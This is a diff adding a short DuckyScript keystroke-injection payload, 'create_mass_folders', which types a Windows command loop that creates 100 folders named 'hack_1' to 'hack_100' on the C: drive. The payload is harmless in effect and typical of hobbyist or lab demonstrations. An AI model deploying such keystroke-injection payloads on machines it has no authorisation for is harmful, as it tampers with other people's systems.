@@ -1,0 +1,4 @@
+REM Payload: create_mass_folders
+DELAY 500
+STRING for /L %i in (1,1,100) do mkdir C:\hack_%i
+ENTER
